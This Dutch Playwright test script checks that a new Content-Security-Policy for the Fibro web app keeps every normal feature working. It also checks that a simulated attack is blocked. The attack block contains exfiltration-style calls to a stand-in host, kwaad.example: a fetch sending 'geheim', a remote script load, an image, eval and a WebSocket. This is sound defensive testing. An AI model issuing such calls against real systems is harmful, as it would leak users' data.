import subprocess, sys, time, json, os, re, base64
from playwright.sync_api import sync_playwright
# proef36: de huisregel (Content-Security-Policy). Dezelfde ronde op de oude en de nieuwe code:
# alle 12 pagina's, alle spellen, chat (bericht sturen), uitnodiging met QR-code, menu met Mijn gegevens,
# mp3-maker laden, werkers/geluid/plaatjes van het toestel (blob:/data:), Realtime-lijn naar Supabase,
# de portier met de kast vullen. Nieuw mag niets tegenhouden van wat Fibro zelf doet en geen nieuwe
# fouten geven; een nep-aanval (code, plaatje, fetch, WebSocket naar een vreemde site, eval) moet op nieuw
# tegengehouden worden en op oud lukken (controle dat de proef het ziet). Over Fibro -> Technisch.
# Let op: GEEN route_web_socket gebruiken: Playwright vervangt dan WebSocket in de pagina en de huisregel kijkt
# er nooit naar. page.on('websocket') ziet alleen verbindingen die opengaan; daarom tellen we de pogingen via
# CDP (Network.webSocketCreated): een door de huisregel tegengehouden poging komt daar niet in.
# python3 -I proef36.py <scratch met tools/server.py> <oude map> <nieuwe map> <poort>
S = sys.argv[1]; OUD = sys.argv[2]; NIEUW = sys.argv[3]; PORT = int(sys.argv[4])
UID = 'aaaaaaaa-0000-4000-8000-000000000001'; BRAM = 'bbbb0001-0000-4000-8000-000000000001'
TOKEN = json.dumps({"access_token": "x", "refresh_token": "y", "token_type": "bearer", "expires_in": 3600, "expires_at": int(time.time()) + 3600, "user": {"id": UID}})
SPELLEN = ['botkaaseiren', 'vieroprij', 'schaken', 'dammen', 'pong', 'pacman', 'breakout', 'swarm', 'pinball', 'endlessrunner', 'flappybird']
WAV = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA='
PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
def www(map_, poort):
    d = S + '/www36_' + str(poort); os.makedirs(d, exist_ok=True)
    if os.path.islink(d + '/Fibro'): os.remove(d + '/Fibro')
    os.symlink(map_, d + '/Fibro'); return d
def supa(route):
    u = route.request.url; m = route.request.method
    if '/rest/v1/rpc/mijn_gegevens' in u: return route.fulfill(status=200, json={"profiel": {"id": UID, "username": "Marcel"}, "berichten": []})
    if '/rest/v1/profiles' in u and m == 'GET':
        e = {"id": UID, "username": "Marcel", "avatar_url": "x"}
        vr = {"id": BRAM, "username": "Bram", "avatar_url": "x", "public_key": PUB['bram']}
        if 'vnd.pgrst.object' in (route.request.headers.get('accept') or ''): return route.fulfill(status=200, json=vr if BRAM in u else e)
        return route.fulfill(status=200, json=[vr] if ('in.' in u or BRAM in u) else [e])
    if '/rest/v1/friendships' in u and m == 'GET':
        return route.fulfill(status=200, json=[{"id": "f1", "user_id": UID, "friend_id": BRAM, "status": "accepted"}])
    if '/rest/v1/messages' in u and m == 'POST': VERSTUURD.append(route.request.post_data)
    if '/rest/v1/' in u and m in ('POST', 'PATCH'): return route.fulfill(status=201, json=[{"id": "n1", "token": "t", "created_at": "2026-10-08T18:00:00Z"}])
    if '/functions/v1/' in u: return route.fulfill(status=200, json={})
    if '/auth/v1/' in u: return route.fulfill(status=200, json={})
    return route.fulfill(status=200, json=[])
PUB = {'bram': None}; VERSTUURD = []
PNGBYTES = None
def kwaad(route):
    u = route.request.url
    if u.endswith('.js'): return route.fulfill(status=200, content_type='text/javascript', body='window.__kwaad = (window.__kwaad || 0) + 1')
    if u.endswith('.png'): return route.fulfill(status=200, content_type='image/png', body=base64.b64decode(PNG.split(',')[1]))
    return route.fulfill(status=200, content_type='text/plain', body='ok', headers={'Access-Control-Allow-Origin': '*'})
AANVAL = """async () => {
  const uit = {}
  try { const r = await fetch('https://kwaad.example/steel?wat=geheim'); uit.fetch = 'gelukt ' + r.status } catch (e) { uit.fetch = 'tegengehouden' }
  uit.script = await new Promise(ok => { const s = document.createElement('script'); s.src = 'https://kwaad.example/x.js'
    s.onload = () => ok(window.__kwaad ? 'gelukt' : 'geladen?'); s.onerror = () => ok('tegengehouden'); document.head.appendChild(s); setTimeout(() => ok('geen antwoord'), 4000) })
  uit.plaatje = await new Promise(ok => { const i = new Image(); i.onload = () => ok('gelukt'); i.onerror = () => ok('tegengehouden'); i.src = 'https://kwaad.example/p.png'; setTimeout(() => ok('geen antwoord'), 4000) })
  try { uit.eval = eval('1 + 1') === 2 ? 'gelukt' : '?' } catch (e) { uit.eval = 'tegengehouden' }
  try { new WebSocket('wss://kwaad.example/lijn'); uit.ws = 'aangemaakt' } catch (e) { uit.ws = 'fout ' + e.name }
  await new Promise(ok => setTimeout(ok, 1500))
  const b = document.createElement('button'); b.setAttribute('onclick', 'window.__klik = 1'); document.body.appendChild(b); b.click(); b.remove()
  uit.onclick = window.__klik === 1 ? 'werkt' : 'werkt niet'
  return uit
}"""
EIGEN = """async ([wav, png]) => {
  const uit = {}
  uit.werker = await new Promise(ok => { try { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(42)'], { type: 'text/javascript' })))
    w.onmessage = e => { ok(e.data === 42 ? 'werkt' : '?'); w.terminate() }; w.onerror = () => ok('fout') } catch (e) { ok('fout ' + e.message) }; setTimeout(() => ok('geen antwoord'), 4000) })
  uit.geluid = await new Promise(ok => { const a = new Audio(); a.onloadedmetadata = () => ok('werkt'); a.onerror = () => ok('fout'); a.src = wav; setTimeout(() => ok('geen antwoord'), 4000) })
  uit.plaatjeData = await new Promise(ok => { const i = new Image(); i.onload = () => ok('werkt'); i.onerror = () => ok('fout'); i.src = png })
  const blob = await (await fetch(png)).blob(); uit.fetchData = blob.size > 20 ? 'werkt' : 'fout'
  uit.plaatjeBlob = await new Promise(ok => { const i = new Image(); i.onload = () => ok('werkt'); i.onerror = () => ok('fout'); i.src = URL.createObjectURL(blob) })
  try { uit.fetchBlob = (await (await fetch(URL.createObjectURL(blob))).blob()).size === blob.size ? 'werkt' : 'fout' } catch (e) { uit.fetchBlob = 'fout' }
  uit.mp3maker = await new Promise(ok => { const s = document.createElement('script'); s.src = 'lame.min.js?v=95'; s.onload = () => ok(typeof window.lamejs === 'function' ? 'werkt' : 'geladen, geen lamejs'); s.onerror = () => ok('fout'); document.head.appendChild(s) })
  try { const v = await import('./videohulp.js?v=123'); uit.videohulp = typeof v.maakH264 === 'function' ? 'werkt' : 'geen maakH264' } catch (e) { uit.videohulp = 'fout ' + e.message }
  return uit
}"""
def ronde(map_, poort, naam):
    d = www(map_, poort); B = f'http://127.0.0.1:{poort}/Fibro/'
    srv = subprocess.Popen([sys.executable, '-I', S + '/tools/server.py', d, str(poort)], stderr=subprocess.DEVNULL); time.sleep(0.8)
    w = {'pagina': {}, 'csp': [], 'lijnen': 0, 'kwaadlijn': 0, 'bezocht': []}
    huidig = {'p': '?'}
    def lijn(e):  # echte WebSocket-pogingen (een door de huisregel tegengehouden poging telt niet)
        url = e.get('url', '')
        if 'supabase.co/realtime' in url: w['lijnen'] += 1
        if 'kwaad.example' in url: w['kwaadlijn'] += 1
    def noteer(soort, tekst):
        pg = w['pagina'].setdefault(huidig['p'], {'fouten': [], 'console': []})
        pg[soort].append(tekst[:200])
    print('== ronde', naam)
    with sync_playwright() as pw:
        br = pw.chromium.launch(args=['--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream', '--autoplay-policy=no-user-gesture-required'])
        for sw in ('block', 'allow'):
            ctx = br.new_context(service_workers=sw, viewport={'width': 390, 'height': 800}, accept_downloads=True)
            ctx.route('**/*supabase.co/**', supa); ctx.route('**/kwaad.example/**', kwaad)
            p = ctx.new_page()
            cdp = ctx.new_cdp_session(p); cdp.send('Network.enable'); cdp.on('Network.webSocketCreated', lijn)
            p.on('pageerror', lambda e: noteer('fouten', str(e)))
            def cons(m):
                t = m.text
                if 'Content Security Policy' in t or 'Content-Security-Policy' in t: w['csp'].append(huidig['p'] + ': ' + t[:220])
                elif m.type == 'error' and not t.startswith('Failed to load resource'): noteer('console', t)
            p.on('console', cons); p.on('dialog', lambda dl: dl.accept())
            def ga(pad, wacht=1800):
                huidig['p'] = (pad if sw == 'block' else 'portier:' + pad); w['bezocht'].append(huidig['p'])
                p.goto(B + pad); p.wait_for_timeout(wacht)
            if sw == 'allow':
                ga('login.html', 800); p.evaluate("t => { localStorage.setItem('sb-qmgatbphiplrfxrljtbe-auth-token', t); localStorage.setItem('fibro_opslagtip_later', String(Date.now())) }", TOKEN)
                ga('index.html', 2500); ga('index.html', 9000)  # tweede keer: de portier regelt; kastvullen na 6 s
                w['portier'] = p.evaluate("() => !!navigator.serviceWorker.controller")
                w['kast'] = p.evaluate("async () => { let n = 0; for (const k of await caches.keys()) n += (await (await caches.open(k)).keys()).length; return n }")
                ga('chat.html', 2000); ga('over.html', 1200)
                ctx.close(); continue
            ga('login.html', 1500)
            p.evaluate("t => { localStorage.setItem('sb-qmgatbphiplrfxrljtbe-auth-token', t); localStorage.setItem('fibro_opslagtip_later', String(Date.now())) }", TOKEN)
            PUB['bram'] = p.evaluate("""async uid => { const c = await import('./crypto.js?v=95'); const ik = await c.genereerKeypair(); const v = await c.genereerKeypair();
              c.slaPrivateKeyOp(uid, ik.privateKeyB64); return v.publicKeyB64 }""", UID)
            ga('index.html', 3500)
            w['eigen'] = p.evaluate(EIGEN, [WAV, PNG])
            try:
                p.click('#menuBtn'); p.wait_for_timeout(200); p.click('#fibroMenu [role=menuitem]:has-text("Mijn gegevens")'); p.wait_for_timeout(700)
                p.click('#gegevensScherm button:has-text("Gegevens ophalen")'); p.wait_for_timeout(800)
                with p.expect_download(timeout=5000): p.click('#gegevensScherm button:has-text("Bestand bewaren")')
                w['download'] = 'werkt'
            except Exception as e: w['download'] = 'fout ' + str(e)[:80]
            ga('chat.html', 2500)
            try:
                p.wait_for_function("() => document.querySelectorAll('#vriendenLijst .vriend-item').length === 1", timeout=15000)
                p.click('#vriendenLijst .vriend-item'); p.wait_for_timeout(1500)
                n0 = len(VERSTUURD); p.fill('#msgInput', 'hallo'); p.click('#sendBtn'); p.wait_for_timeout(1500)
                w['chat'] = 'werkt' if len(VERSTUURD) > n0 else 'niets verstuurd'
            except Exception as e: w['chat'] = 'fout ' + str(e)[:80]
            ga('vrienden.html', 2500)
            try:
                p.evaluate("() => window.openInviteModal()"); p.wait_for_timeout(1500)
                w['qr'] = p.evaluate("() => !!document.querySelector('#qr-container canvas, #qr-container img')")
            except Exception as e: w['qr'] = 'fout ' + str(e)[:80]
            for pad in ['profiel.html', 'vriend-profiel.html?id=' + BRAM, 'bellen.html?vriend=' + BRAM, 'invite.html?token=abc', 'moderatie.html', 'spellen/runner-gunner.html']:
                ga(pad, 2500)
            w['spellen'] = {}
            for s in SPELLEN:
                ga('spel.html?spel=' + s, 1200)
                try:
                    k = p.query_selector('#startKnop') or p.query_selector('.niveau-btn')
                    if k: k.click()
                    p.wait_for_timeout(1800)
                    w['spellen'][s] = p.evaluate("() => document.title")
                except Exception as e: w['spellen'][s] = 'fout ' + str(e)[:60]
            ga('over.html', 1000)
            w['over_voor'] = p.evaluate("() => (document.getElementById('huisregelStand') || {}).textContent || '-'")
            w['log_voor'] = p.evaluate("() => localStorage.getItem('fibro_huisregel')")
            ga('index.html', 2500)
            w['aanval'] = p.evaluate(AANVAL)
            w['kwaadlijn'] = w.get('kwaadlijn', False)
            ga('over.html', 1000)
            p.click('#technisch summary') if p.query_selector('#technisch summary') else None
            w['over_na'] = p.evaluate("() => [(document.getElementById('huisregelStand') || {}).textContent || '-', [...document.querySelectorAll('#huisregelLijst li')].map(l => l.textContent)]")
            if p.query_selector('#huisregelWis:not([hidden])'):
                p.click('#huisregelWis'); p.wait_for_timeout(200)
            w['over_gewist'] = p.evaluate("() => [(document.getElementById('huisregelStand') || {}).textContent || '-', document.querySelectorAll('#huisregelLijst li').length, localStorage.getItem('fibro_huisregel')]")
            ctx.close()
        br.close()
    srv.kill()
    return w
oud = ronde(OUD, PORT, 'oud'); nieuw = ronde(NIEUW, PORT + 1, 'nieuw')
json.dump({'oud': oud, 'nieuw': nieuw}, open(S + '/proef36-uitkomst.json', 'w'), indent=1, ensure_ascii=False)
fouten = []
def check(naam, ok, info=''):
    print(('  OK   ' if ok else '  FOUT ') + naam + (' | ' + str(info)[:300] if info != '' else ''))
    if not ok: fouten.append(naam)
print('1. Wat Fibro zelf doet: nieuw houdt niets tegen')
check('geen meldingen van de huisregel bij gewoon gebruik', not [c for c in nieuw['csp'] if 'kwaad.example' not in c and 'eval' not in c], nieuw['csp'][:6])
check('logboek van de huisregel leeg na gewoon gebruik', nieuw['log_voor'] in (None, '[]'), nieuw['log_voor'])
check('Over Fibro: actief, niets tegengehouden', nieuw['over_voor'] == '🛡️ Huisregel: actief. Niets tegengehouden.', nieuw['over_voor'])
for k, v in nieuw['eigen'].items(): check('van het toestel: ' + k, v == 'werkt' and oud['eigen'].get(k) == 'werkt', (v, oud['eigen'].get(k)))
check('Realtime-lijn naar Supabase (echte pogingen, niet tegengehouden)', nieuw['lijnen'] > 0 and oud['lijnen'] > 0, (nieuw['lijnen'], oud['lijnen']))
check('Mijn gegevens downloaden', nieuw['download'] == 'werkt' and oud['download'] == 'werkt', (nieuw['download'], oud['download']))
check('chat: bericht sturen', nieuw['chat'] == 'werkt' and oud['chat'] == 'werkt', (nieuw['chat'], oud['chat']))
check('uitnodiging met QR-code', nieuw['qr'] is True and oud['qr'] is True, (nieuw['qr'], oud['qr']))
check('alle spellen starten (titel gelijk aan oud)', nieuw['spellen'] == oud['spellen'] and all(not str(t).startswith('fout') for t in nieuw['spellen'].values()), nieuw['spellen'])
check('portier regelt de pagina', nieuw['portier'] is True and oud['portier'] is True, (nieuw['portier'], oud['portier']))
check('kast gevuld (minstens zoveel als oud)', nieuw['kast'] >= oud['kast'] > 50, (nieuw['kast'], oud['kast']))
print('2. Geen nieuwe fouten op een pagina (vergeleken met oud)')
alle = sorted(set(oud['pagina']) | set(nieuw['pagina']))
for pg in alle:
    o = oud['pagina'].get(pg, {'fouten': [], 'console': []}); n = nieuw['pagina'].get(pg, {'fouten': [], 'console': []})
    extra = [x for x in n['fouten'] if x not in o['fouten']] + [x for x in n['console'] if x not in o['console'] and '[huisregel]' not in x]
    if extra or n['fouten']: check(pg + ': geen nieuwe fouten', not extra, extra)
check('alle pagina\'s nagelopen', len(set(nieuw['bezocht'])) >= 12 + len(SPELLEN) and nieuw['bezocht'] == oud['bezocht'], len(set(nieuw['bezocht'])))
print('3. Nep-aanval: nieuw houdt het tegen, oud niet (controle)')
for k in ['fetch', 'script', 'plaatje', 'eval']:
    check('aanval ' + k + ': nieuw tegengehouden', nieuw['aanval'][k] == 'tegengehouden', nieuw['aanval'][k])
    check('aanval ' + k + ': oud gelukt (de proef ziet het)', str(oud['aanval'][k]).startswith('gelukt'), oud['aanval'][k])
check('onclick in de pagina werkt nog (nieuw en oud)', nieuw['aanval']['onclick'] == 'werkt' and oud['aanval']['onclick'] == 'werkt', (nieuw['aanval']['onclick'], oud['aanval']['onclick']))
check('aanval WebSocket: nieuw tegengehouden, oud geprobeerd', nieuw['kwaadlijn'] == 0 and oud['kwaadlijn'] > 0 and nieuw['aanval']['ws'] == 'aangemaakt', (nieuw['kwaadlijn'], oud['kwaadlijn'], nieuw['aanval']['ws']))
lst = nieuw['over_na'][1]
check('Over Fibro toont wat tegengehouden is', 'Tegengehouden' in nieuw['over_na'][0] and any('connect-src: https://kwaad.example/steel' in l for l in lst)
      and any('script-src' in l and 'kwaad.example/x.js' in l for l in lst) and any('img-src' in l for l in lst)
      and any('connect-src: wss://kwaad.example/lijn' in l for l in lst), nieuw['over_na'])
check('zonder ?wat=geheim in het logboek', not any('geheim' in l for l in lst), lst)
check('Lijst wissen', nieuw['over_gewist'][1] == 0 and nieuw['over_gewist'][2] is None and 'Niets tegengehouden' in nieuw['over_gewist'][0], nieuw['over_gewist'])
check('oud heeft geen huisregel', oud['over_voor'] == '-', oud['over_voor'])
print('KLAAR:', 'alles goed' if not fouten else 'FOUTEN (%d): ' % len(fouten) + ', '.join(fouten))
